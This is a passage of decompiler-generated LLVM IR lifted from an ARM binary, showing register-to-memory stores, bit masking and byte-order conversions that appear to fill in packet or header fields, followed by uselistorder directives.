bb80:                                             ; preds = %dec_label_pc_9cfc, %bb79
  %v0_9de4 = load i32, i32* %r1.global-to-local, align 4
  %v1_9de4 = trunc i32 %v0_9de4 to i8
  %v2_9de4 = load i32, i32* @r4, align 4
  %v3_9de4 = add i32 %v2_9de4, 8
  %v4_9de4 = inttoptr i32 %v3_9de4 to i8*
  store i8 %v1_9de4, i8* %v4_9de4, align 1
  %v0_9de8 = load i32, i32* %r3.global-to-local, align 4
  %v1_9de8 = trunc i32 %v0_9de8 to i8
  %v2_9de8 = load i32, i32* @r4, align 4
  %v3_9de8 = add i32 %v2_9de8, 9
  %v4_9de8 = inttoptr i32 %v3_9de8 to i8*
  store i8 %v1_9de8, i8* %v4_9de8, align 1
  %v0_9dec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_9dec, label %bb82, label %bb81

bb81:                                             ; preds = %bb80
  %v1_9dec = load i32, i32* %r2.global-to-local, align 4
  %v2_9dec = trunc i32 %v1_9dec to i16
  %v3_9dec = load i32, i32* @r4, align 4
  %v4_9dec = add i32 %v3_9dec, 6
  %v5_9dec = inttoptr i32 %v4_9dec to i16*
  store i16 %v2_9dec, i16* %v5_9dec, align 2
  br label %bb82

bb82:                                             ; preds = %bb80, %bb81
  store i32 ptrtoint (i32* @global_var_20a5c.46 to i32), i32* %r2.global-to-local, align 4
  %v2_9df4 = load i32, i32* @global_var_20a5c.46, align 4
  store i32 %v2_9df4, i32* %r1.global-to-local, align 4
  %v1_9df8 = load i32, i32* @r4, align 4
  %v2_9df8 = add i32 %v1_9df8, 12
  %v3_9df8 = inttoptr i32 %v2_9df8 to i32*
  store i32 %v2_9df4, i32* %v3_9df8, align 4
  %v3_9dfc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9dfc, i32* %r3.global-to-local, align 4
  store i32 %v2_98d8, i32* %ip.global-to-local, align 4
  %v4_9e04 = mul i32 %v3_9dfc, 16
  %v5_9e04 = add i32 %v4_9e04, %v2_98d8
  %v6_9e04 = inttoptr i32 %v5_9e04 to i32*
  %v7_9e04 = load i32, i32* %v6_9e04, align 4
  store i32 %v7_9e04, i32* %r2.global-to-local, align 4
  store i32 %v5_9e04, i32* %r3.global-to-local, align 4
  %v1_9e10 = load i32, i32* @r4, align 4
  %v2_9e10 = add i32 %v1_9e10, 16
  %v3_9e10 = inttoptr i32 %v2_9e10 to i32*
  store i32 %v7_9e04, i32* %v3_9e10, align 4
  %v0_9e14 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e14 = add i32 %v0_9e14, 12
  %v2_9e14 = inttoptr i32 %v1_9e14 to i16*
  %v3_9e14 = load i16, i16* %v2_9e14, align 2
  %v4_9e14 = zext i16 %v3_9e14 to i32
  store i32 %v4_9e14, i32* %r0.global-to-local, align 4
  %v1_9e18 = add i32 %v0_9e14, 8
  %v2_9e18 = inttoptr i32 %v1_9e18 to i32*
  %v3_9e18 = load i32, i32* %v2_9e18, align 4
  store i32 %v3_9e18, i32* %r1.global-to-local, align 4
  %v2_9e1c = load i32, i32* @r4, align 4
  %v3_9e1c = add i32 %v2_9e1c, 20
  %v4_9e1c = inttoptr i32 %v3_9e1c to i16*
  store i16 %v3_9e14, i16* %v4_9e1c, align 2
  %v0_9e20 = load i32, i32* @r4, align 4
  %v1_9e20 = add i32 %v0_9e20, 20
  store i32 %v1_9e20, i32* @r8, align 4
  %v1_9e24 = add i32 %v0_9e20, 33
  %v2_9e24 = inttoptr i32 %v1_9e24 to i8*
  %v3_9e24 = load i8, i8* %v2_9e24, align 1
  %v4_9e24 = zext i8 %v3_9e24 to i32
  store i32 %v4_9e24, i32* %r2.global-to-local, align 4
  %v0_9e28 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e28 = add i32 %v0_9e20, 24
  %v3_9e28 = inttoptr i32 %v2_9e28 to i32*
  store i32 %v0_9e28, i32* %v3_9e28, align 4
  %v0_9e2c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e2c = or i32 %v0_9e2c, 1
  store i32 %v1_9e2c, i32* %r2.global-to-local, align 4
  %v0_9e30 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e30 = add i32 %v0_9e30, 4
  %v2_9e30 = inttoptr i32 %v1_9e30 to i32*
  %v3_9e30 = load i32, i32* %v2_9e30, align 4
  store i32 %v3_9e30, i32* %r1.global-to-local, align 4
  %v1_9e34 = add i32 %v0_9e30, 14
  %v2_9e34 = inttoptr i32 %v1_9e34 to i16*
  %v3_9e34 = load i16, i16* %v2_9e34, align 2
  %v4_9e34 = zext i16 %v3_9e34 to i32
  store i32 %v4_9e34, i32* %r3.global-to-local, align 4
  %v1_9e38 = trunc i32 %v1_9e2c to i8
  %v2_9e38 = load i32, i32* @r8, align 4
  %v3_9e38 = add i32 %v2_9e38, 13
  %v4_9e38 = inttoptr i32 %v3_9e38 to i8*
  store i8 %v1_9e38, i8* %v4_9e38, align 1
  %v0_9e3c = load i32, i32* %r3.global-to-local, align 4
  %v1_9e3c = trunc i32 %v0_9e3c to i16
  %v2_9e3c = load i32, i32* @r8, align 4
  %v3_9e3c = add i32 %v2_9e3c, 2
  %v4_9e3c = inttoptr i32 %v3_9e3c to i16*
  store i16 %v1_9e3c, i16* %v4_9e3c, align 2
  %v0_9e40 = load i32, i32* @r8, align 4
  %v1_9e40 = add i32 %v0_9e40, 12
  %v2_9e40 = inttoptr i32 %v1_9e40 to i8*
  %v3_9e40 = load i8, i8* %v2_9e40, align 1
  %v4_9e40 = zext i8 %v3_9e40 to i32
  store i32 %v4_9e40, i32* %r3.global-to-local, align 4
  %v1_9e44 = add i32 %v0_9e40, 13
  %v2_9e44 = inttoptr i32 %v1_9e44 to i8*
  %v3_9e44 = load i8, i8* %v2_9e44, align 1
  %v4_9e44 = zext i8 %v3_9e44 to i32
  %tmp104 = urem i8 %v3_9e40, 16
  %v1_9e48 = zext i8 %tmp104 to i32
  %v1_9e4c = or i32 %v1_9e48, 128
  store i32 %v1_9e4c, i32* %r3.global-to-local, align 4
  %v1_9e50 = or i32 %v4_9e44, 16
  store i32 %v1_9e50, i32* %r2.global-to-local, align 4
  %v0_9e54 = load i32, i32* %r1.global-to-local, align 4
  %v2_9e54 = add i32 %v0_9e40, 8
  %v3_9e54 = inttoptr i32 %v2_9e54 to i32*
  store i32 %v0_9e54, i32* %v3_9e54, align 4
  %v0_9e58 = load i32, i32* %r3.global-to-local, align 4
  %v1_9e58 = trunc i32 %v0_9e58 to i8
  %v2_9e58 = load i32, i32* @r8, align 4
  %v3_9e58 = add i32 %v2_9e58, 12
  %v4_9e58 = inttoptr i32 %v3_9e58 to i8*
  store i8 %v1_9e58, i8* %v4_9e58, align 1
  %v0_9e5c = load i32, i32* %r2.global-to-local, align 4
  %v1_9e5c = trunc i32 %v0_9e5c to i8
  %v2_9e5c = load i32, i32* @r8, align 4
  %v3_9e5c = add i32 %v2_9e5c, 13
  %v4_9e5c = inttoptr i32 %v3_9e5c to i8*
  store i8 %v1_9e5c, i8* %v4_9e5c, align 1
  %v0_9e60 = call i32 @function_e0b8()
  %v1_9e60 = trunc i32 %v0_9e60 to i16
  store i32 %v0_9e60, i32* %r0.global-to-local, align 4
  store i32 %v1_99a4, i32* %r1.global-to-local, align 4
  %v0_9e68 = load i32, i32* @r8, align 4
  %v1_9e68 = add i32 %v0_9e68, 13
  %v2_9e68 = inttoptr i32 %v1_9e68 to i8*
  %v3_9e68 = load i8, i8* %v2_9e68, align 1
  %v4_9e68 = zext i8 %v3_9e68 to i32
  store i32 %v1_9e6c, i32* %r2.global-to-local, align 4
  %v1_9e70 = and i32 %v4_9e68, 223
  %v5_9e74 = or i32 %v1_9e70, %v4_9e74
  store i32 %v5_9e74, i32* %r3.global-to-local, align 4
  %v1_9e78 = trunc i32 %v5_9e74 to i8
  store i8 %v1_9e78, i8* %v2_9e68, align 1
  store i32 %v1_99c4, i32* %ip.global-to-local, align 4
  %v0_9e80 = load i32, i32* @r8, align 4
  %v1_9e80 = add i32 %v0_9e80, 13
  %v2_9e80 = inttoptr i32 %v1_9e80 to i8*
  %v3_9e80 = load i8, i8* %v2_9e80, align 1
  %v4_9e80 = zext i8 %v3_9e80 to i32
  store i32 %v1_9e84, i32* %r3.global-to-local, align 4
  %v1_9e88 = and i32 %v4_9e80, 239
  %v5_9e8c = or i32 %v1_9e88, %v4_9e8c
  store i32 %v5_9e8c, i32* %r2.global-to-local, align 4
  %v1_9e90 = trunc i32 %v5_9e8c to i8
  store i8 %v1_9e90, i8* %v2_9e80, align 1
  store i32 %v1_99e4, i32* %r1.global-to-local, align 4
  %v0_9e98 = load i32, i32* @r8, align 4
  %v1_9e98 = add i32 %v0_9e98, 13
  %v2_9e98 = inttoptr i32 %v1_9e98 to i8*
  %v3_9e98 = load i8, i8* %v2_9e98, align 1
  %v4_9e98 = zext i8 %v3_9e98 to i32
  store i32 %v1_9e9c, i32* %r2.global-to-local, align 4
  %v1_9ea0 = and i32 %v4_9e98, 247
  %v5_9ea4 = or i32 %v1_9ea0, %v4_9ea4
  store i32 %v5_9ea4, i32* %r3.global-to-local, align 4
  %v1_9ea8 = trunc i32 %v5_9ea4 to i8
  store i8 %v1_9ea8, i8* %v2_9e98, align 1
  store i32 %v1_9a04, i32* %ip.global-to-local, align 4
  %v0_9eb0 = load i32, i32* @r8, align 4
  %v1_9eb0 = add i32 %v0_9eb0, 13
  %v2_9eb0 = inttoptr i32 %v1_9eb0 to i8*
  %v3_9eb0 = load i8, i8* %v2_9eb0, align 1
  %v4_9eb0 = zext i8 %v3_9eb0 to i32
  store i32 %v1_9eb4, i32* %r3.global-to-local, align 4
  %v1_9eb8 = and i32 %v4_9eb0, 251
  %v5_9ebc = or i32 %v1_9eb8, %v4_9ebc
  store i32 %v5_9ebc, i32* %r2.global-to-local, align 4
  %v1_9ec0 = trunc i32 %v5_9ebc to i8
  store i8 %v1_9ec0, i8* %v2_9eb0, align 1
  store i32 %v1_9a24, i32* %r1.global-to-local, align 4
  %v0_9ec8 = load i32, i32* @r8, align 4
  %v1_9ec8 = add i32 %v0_9ec8, 13
  %v2_9ec8 = inttoptr i32 %v1_9ec8 to i8*
  %v3_9ec8 = load i8, i8* %v2_9ec8, align 1
  %v4_9ec8 = zext i8 %v3_9ec8 to i32
  store i32 %v1_9ecc, i32* %r2.global-to-local, align 4
  %v1_9ed0 = and i32 %v4_9ec8, 253
  %v4_9ed4 = or i32 %v1_9ed0, %v3_9ed4
  store i32 %v4_9ed4, i32* %r3.global-to-local, align 4
  %v1_9ed8 = trunc i32 %v4_9ed4 to i8
  store i8 %v1_9ed8, i8* %v2_9ec8, align 1
  store i32 %v1_9a44, i32* %ip.global-to-local, align 4
  %v0_9ee0 = load i32, i32* @r8, align 4
  %v1_9ee0 = add i32 %v0_9ee0, 13
  %v2_9ee0 = inttoptr i32 %v1_9ee0 to i8*
  %v3_9ee0 = load i8, i8* %v2_9ee0, align 1
  %v4_9ee0 = zext i8 %v3_9ee0 to i32
  %v1_9ee8 = and i32 %v4_9ee0, 254
  store i32 %v1_9ee8, i32* %r2.global-to-local, align 4
  %v2_9eec = or i32 %v1_9ee8, %v1_9ee4
  store i32 %v2_9eec, i32* %r3.global-to-local, align 4
  %v1_9ef0 = trunc i32 %v2_9eec to i8
  store i8 %v1_9ef0, i8* %v2_9ee0, align 1
  %v3_9ef4 = load i32, i32* @r8, align 4
  %v4_9ef4 = add i32 %v3_9ef4, 14
  %v5_9ef4 = inttoptr i32 %v4_9ef4 to i16*
  store i16 %v1_9e60, i16* %v5_9ef4, align 2
  store i32 %v6_9a5c, i32* %r1.global-to-local, align 4
  %v0_9efc = load i32, i32* @r4, align 4
  %v1_9efc = add i32 %v0_9efc, 40
  store i32 %v1_9efc, i32* %r0.global-to-local, align 4
  %v2_9f00 = inttoptr i32 %v1_9efc to i16*
  %v3_9f00 = call i32 @function_e24c(i16* %v2_9f00, i32 %v6_9a5c)
  store i32 %v3_9f00, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9c54

dec_label_pc_9f08:                                ; preds = %dec_label_pc_9ac8
  store i32 %v6_9a5c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_9a5c, 40
  br label %dec_label_pc_9f18

dec_label_pc_9f18:                                ; preds = %dec_label_pc_9c68, %dec_label_pc_9f08
  %storemerge6.pre-phi = phi i32 [ %v1_9d58, %dec_label_pc_9c68 ], [ %.pre, %dec_label_pc_9f08 ]
  %v0_9f2c26 = phi i32 [ %v1_9c5c, %dec_label_pc_9c68 ], [ 0, %dec_label_pc_9f08 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_9a5c, 65536
  %storemerge = add i32 %v6_9a5c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_9f18 = add i32 %storemerge4, 1310720
  store i32 %v1_9f18, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_9f18, 256
  %v3_9f20 = and i32 %tmp83, 65280
  store i32 %v3_9f20, i32* %r3.global-to-local, align 4
  %v4_9f24 = udiv i32 %v1_9f18, 16777216
  %v5_9f24 = or i32 %v3_9f20, %v4_9f24
  store i32 %v5_9f24, i32* @r8, align 4
  %v2_a050 = icmp eq i32 %v1_9a7c, 0
  br label %dec_label_pc_9f28

dec_label_pc_9f28:                                ; preds = %dec_label_pc_9f28, %dec_label_pc_a034, %dec_label_pc_9f18
  %v0_9f2c = phi i32 [ %v0_9f2c26, %dec_label_pc_9f18 ], [ 0, %dec_label_pc_a034 ], [ 0, %dec_label_pc_9f28 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_9f2c = icmp eq i32 %v0_9f2c, 0
  store i1 %v2_9f2c, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_9f2c, label %dec_label_pc_9f28, label %dec_label_pc_9f38

dec_label_pc_9f38:                                ; preds = %dec_label_pc_9f28, %dec_label_pc_a034
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f3c

dec_label_pc_9f3c:                                ; preds = %dec_label_pc_9f64, %dec_label_pc_9f38
  %v1_9f44 = phi i32 [ %v1_a024, %dec_label_pc_9f64 ], [ 0, %dec_label_pc_9f38 ]
  store i32 %v2_98e8, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_9f44 = mul i32 %v1_9f44, 4
  %v5_9f44 = add i32 %v4_9f44, %v2_98e8
  %v6_9f44 = inttoptr i32 %v5_9f44 to i32*
  %v7_9f44 = load i32, i32* %v6_9f44, align 4
  store i32 %v7_9f44, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_9f4c = load i32, i32* @fp, align 4
  %v9_9f4c = icmp eq i32 %v0_9f4c, 65535
  store i1 %v9_9f4c, i1* %cpsr_z.global-to-local, align 1
  %v1_9f50 = add i32 %v7_9f44, 20
  store i32 %v1_9f50, i32* @r5, align 4
  br i1 %v9_9f4c, label %dec_label_pc_a048, label %dec_label_pc_9f58

dec_label_pc_9f58:                                ; preds = %dec_label_pc_9f3c
  store i32 %v1_9a7c, i32* %r3.global-to-local, align 4
  store i1 %v2_a050, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a050, label %dec_label_pc_9f64, label %dec_label_pc_a05c

dec_label_pc_9f64:                                ; preds = %dec_label_pc_9f58, %dec_label_pc_a048, %dec_label_pc_a05c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_9f68 = load i32, i32* @r4, align 4
  %v3_9f68 = add i32 %v2_9f68, 10
  %v4_9f68 = inttoptr i32 %v3_9f68 to i16*
  store i16 0, i16* %v4_9f68, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_9f70 = load i32, i32* @r4, align 4
  store i32 %v0_9f70, i32* @r0, align 4
  %v2_9f74 = call i32 @function_c848(i32 %v0_9f70, i32 20)
  %v3_9f74 = trunc i32 %v2_9f74 to i16
  store i32 %v2_9f74, i32* %r0.global-to-local, align 4
  %v3_9f78 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_98d8, i32* %r2.global-to-local, align 4
  %v3_9f80 = mul i32 %v3_9f78, 16
  %v2_9f84 = add i32 %v3_9f80, %v2_98d8
  store i32 %v2_9f84, i32* %r1.global-to-local, align 4
  %v1_9f88 = add i32 %v2_9f84, 4
  %v2_9f88 = inttoptr i32 %v1_9f88 to i32*
  %v3_9f88 = load i32, i32* %v2_9f88, align 4
  %v3_9f8c = mul i32 %v3_9f88, 65536
  store i32 %v3_9f8c, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_9f88, 256
  %v1_9f94 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_9f88, 256
  %v4_9f98 = urem i32 %tmp86, 256
  %v5_9f98 = or i32 %v4_9f98, %v1_9f94
  store i32 %v5_9f98, i32* %r3.global-to-local, align 4
  %v1_9f9c = add i32 %v3_9f88, 1
  store i32 %v1_9f9c, i32* %r2.global-to-local, align 4
  store i32 %v1_9f9c, i32* %v2_9f88, align 4
  %v0_9fa4 = load i32, i32* %r3.global-to-local, align 4
  %v1_9fa4 = load i32, i32* @r5, align 4
  %v2_9fa4 = add i32 %v1_9fa4, 4
  %v3_9fa4 = inttoptr i32 %v2_9fa4 to i32*
  store i32 %v0_9fa4, i32* %v3_9fa4, align 4
  %v0_9fa8 = load i32, i32* %r1.global-to-local, align 4
  %v1_9fa8 = add i32 %v0_9fa8, 8
  %v2_9fa8 = inttoptr i32 %v1_9fa8 to i32*
  %v3_9fa8 = load i32, i32* %v2_9fa8, align 4
  %tmp87 = mul i32 %v3_9fa8, 256
  %v1_9fb4 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_9fa8, 256
  %v4_9fb8 = urem i32 %tmp88, 256
  %v5_9fb8 = or i32 %v4_9fb8, %v1_9fb4
  %v1_9fbc = load i32, i32* @r5, align 4
  %v2_9fbc = add i32 %v1_9fbc, 8
  %v3_9fbc = inttoptr i32 %v2_9fbc to i32*
  store i32 %v5_9fb8, i32* %v3_9fbc, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9fc4 = load i32, i32* @r4, align 4
  %v4_9fc4 = add i32 %v3_9fc4, 10
  %v5_9fc4 = inttoptr i32 %v4_9fc4 to i16*
  store i16 %v3_9f74, i16* %v5_9fc4, align 2
  %v0_9fc8 = load i32, i32* @r5, align 4
  store i32 %v0_9fc8, i32* @r1, align 4
  %v0_9fcc = load i32, i32* %r3.global-to-local, align 4
  %v1_9fcc = trunc i32 %v0_9fcc to i16
  %v3_9fcc = add i32 %v0_9fc8, 16
  %v4_9fcc = inttoptr i32 %v3_9fcc to i16*
  store i16 %v1_9fcc, i16* %v4_9fcc, align 2
  %v0_9fd0 = load i32, i32* @r8, align 4
  store i32 %v0_9fd0, i32* %r2.global-to-local, align 4
  %v0_9fd4 = load i32, i32* @sl, align 4
  store i32 %v0_9fd4, i32* %r3.global-to-local, align 4
  %v0_9fd8 = load i32, i32* @r4, align 4
  store i32 %v0_9fd8, i32* %r0.global-to-local, align 4
  %v4_9fdc = call i32 @function_c898(i32 %v0_9fd8, i32 %v0_9fc8, i32 %v0_9fd0, i32 %v0_9fd4)
  %v5_9fdc = trunc i32 %v4_9fdc to i16
  store i32 %v4_9fdc, i32* %r0.global-to-local, align 4
  %v3_9fe0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_9fe0, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_9fe8 = mul i32 %v3_9fe0, 32
  store i32 %v3_9fe8, i32* %lr.global-to-local, align 4
  %v3_9fec = load i32, i32* @r5, align 4
  %v4_9fec = add i32 %v3_9fec, 16
  %v5_9fec = inttoptr i32 %v4_9fec to i16*
  store i16 %v5_9fdc, i16* %v5_9fec, align 2
  %v0_9ff0 = load i32, i32* %lr.global-to-local, align 4
  %v1_9ff0 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_9ff0, -8
  %v5_9ff0 = add i32 %v0_9ff0, %tmp105
  store i32 %v5_9ff0, i32* %lr.global-to-local, align 4
  %v0_9ff4 = load i32, i32* @r5, align 4
  %v1_9ff4 = add i32 %v0_9ff4, 2
  %v2_9ff4 = inttoptr i32 %v1_9ff4 to i16*
  %v3_9ff4 = load i16, i16* %v2_9ff4, align 2
  %v1_9ff8 = load i32, i32* %ip.global-to-local, align 4
  %v2_9ff8 = add i32 %v1_9ff8, %v5_9ff0
  store i32 %v2_9ff8, i32* @lr, align 4
  %v3_9ffc = add i32 %v2_9ff8, 2
  %v4_9ffc = inttoptr i32 %v3_9ffc to i16*
  store i16 %v3_9ff4, i16* %v4_9ffc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_a008 = load i32, i32* @r4, align 4
  store i32 %v0_a008, i32* %r1.global-to-local, align 4
  %v0_a00c = load i32, i32* @sb, align 4
  store i32 %v0_a00c, i32* %r0.global-to-local, align 4
  %v0_a010 = load i32, i32* @r7, align 4
  store i32 %v0_a010, i32* %r2.global-to-local, align 4
  %v0_a014 = load i32, i32* @lr, align 4
  %v6_a01c = call i32 @function_11570(i32 %v0_a00c, i32 %v0_a008, i32 %v0_a010, i32 16384, i32 %v0_a014, i32 16)
  %v3_a020 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_a020, i32* %r3.global-to-local, align 4
  %v1_a024 = add i32 %v3_a020, 1
  store i32 %v1_a024, i32* %r0.global-to-local, align 4
  %v0_a028 = load i32, i32* @r6, align 4
  %v9_a028 = icmp eq i32 %v0_a028, %v1_a024
  store i1 %v9_a028, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a024, i32* %stack_var_-44, align 4
  %v8_a030 = icmp sgt i32 %v0_a028, %v1_a024
  br i1 %v8_a030, label %dec_label_pc_9f3c, label %dec_label_pc_a034

dec_label_pc_a034:                                ; preds = %dec_label_pc_9f64
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_a038 = icmp eq i32 %v0_a028, 0
  store i1 %v2_a038, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_a038, label %dec_label_pc_9f28, label %dec_label_pc_9f38

dec_label_pc_a048:                                ; preds = %dec_label_pc_9f3c
  %v0_a048 = call i32 @function_e0b8()
  %v1_a048 = trunc i32 %v0_a048 to i16
  store i32 %v0_a048, i32* %r0.global-to-local, align 4
  store i32 %v1_9a7c, i32* %r3.global-to-local, align 4
  store i1 %v2_a050, i1* %cpsr_z.global-to-local, align 1
  %v3_a054 = load i32, i32* @r4, align 4
  %v4_a054 = add i32 %v3_a054, 4
  %v5_a054 = inttoptr i32 %v4_a054 to i16*
  store i16 %v1_a048, i16* %v5_a054, align 2
  br i1 %v2_a050, label %dec_label_pc_9f64, label %dec_label_pc_a048.dec_label_pc_a05c_crit_edge

dec_label_pc_a048.dec_label_pc_a05c_crit_edge:    ; preds = %dec_label_pc_a048
  %v0_a05c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_a05c

dec_label_pc_a05c:                                ; preds = %dec_label_pc_a048.dec_label_pc_a05c_crit_edge, %dec_label_pc_9f58
  %v0_a05c = phi i32 [ %v0_a05c.pre, %dec_label_pc_a048.dec_label_pc_a05c_crit_edge ], [ %v7_9f44, %dec_label_pc_9f58 ]
  %v1_a05c = add i32 %v0_a05c, 40
  store i32 %v1_a05c, i32* %r0.global-to-local, align 4
  store i32 %v6_9a5c, i32* %r1.global-to-local, align 4
  %v2_a064 = inttoptr i32 %v1_a05c to i16*
  %v3_a064 = call i32 @function_e24c(i16* %v2_a064, i32 %v6_9a5c)
  store i32 %v3_a064, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9f64

; uselistorder directives
  uselistorder i32 %v0_a048, { 1, 0 }
  uselistorder i32 %v1_a024, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_9ff0, { 1, 0 }
  uselistorder i32 %v4_9fdc, { 1, 0 }
  uselistorder i32 %v3_9fa8, { 1, 0 }
  uselistorder i32 %v3_9f88, { 3, 2, 0, 1 }
  uselistorder i32 %v2_9f74, { 1, 0 }
  uselistorder i1 %v2_a050, { 2, 3, 1, 0 }
  uselistorder i32 %v0_9e60, { 1, 0 }
  uselistorder i32 %v0_9d98, { 1, 0 }
  uselistorder i32 %v5_9d2c, { 1, 0 }
  uselistorder i32 %v0_9cec, { 1, 0 }
  uselistorder i32 %v0_9ca8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_9c58, { 1, 0, 2, 3 }
  uselistorder i32 %v3_9c44, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_9bd0, { 1, 0 }
  uselistorder i32 %v6_9bc8, { 0, 2, 1, 3 }
  uselistorder i1 %v9_9bf8, { 1, 0 }
  uselistorder i32 %v4_9c0c, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_9b54, { 1, 0, 2 }
  uselistorder i32 %v0_9d04, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_9b44, { 1, 0 }
  uselistorder i1 %v7_9b3c, { 1, 0, 2 }
  uselistorder i1 %v7_9af0, { 1, 0 }
  uselistorder i32 %v3_9aec, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_9ecc, { 1, 0 }
  uselistorder i32 %v1_9eb4, { 1, 0 }
  uselistorder i32 %v1_9e9c, { 1, 0 }
  uselistorder i32 %v1_9e84, { 1, 0 }
  uselistorder i32 %v1_9e6c, { 1, 0 }
  uselistorder i32 %v3_9c04, { 1, 0 }
  uselistorder i1 %v2_9c20, { 1, 0 }
  uselistorder i32 %v1_9c1c, { 1, 0 }
  uselistorder i32 %v4_9c18, { 2, 0, 1 }
  uselistorder i32 %v2_9b2c, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_9ac8, { 1, 0 }
  uselistorder i1 %v7_9ac0, { 1, 0 }
  uselistorder i1 %v7_9a94, { 1, 0 }
  uselistorder i32 %v3_9a90, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_9a7c, { 2, 3, 1, 0 }
  uselistorder i32 %v6_9a5c, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_9a44, { 1, 2, 0 }
  uselistorder i32 %v1_9a24, { 1, 2, 0 }
  uselistorder i32 %v1_9a04, { 1, 2, 0 }
  uselistorder i32 %v1_99e4, { 1, 2, 0 }
  uselistorder i32 %v1_99c4, { 1, 2, 0 }
  uselistorder i32 %v1_99a4, { 1, 2, 0 }
  uselistorder i32 %v6_9980, { 1, 0 }
  uselistorder i32 %v1_9968, { 1, 2, 0 }
  uselistorder i32 %v6_9900, { 2, 1, 3, 0 }
  uselistorder i32 %v2_98e8, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v2_98d8, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 49, 48, 50, 52, 51, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 2, 5, 4, 6, 8, 7, 10, 9, 12, 11, 17, 13, 14, 15, 16, 20, 18, 19, 22, 21, 23, 26, 25, 24, 27, 28, 29, 31, 32, 30, 1, 34, 33, 35, 36, 37, 39, 38, 40, 42, 41, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9f64, { 2, 1, 0 }
  uselistorder label %dec_label_pc_9f38, { 1, 0 }
  uselistorder label %dec_label_pc_9f28, { 1, 0, 2 }
  uselistorder label %dec_label_pc_9f18, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_9c84, { 2, 0, 1 }
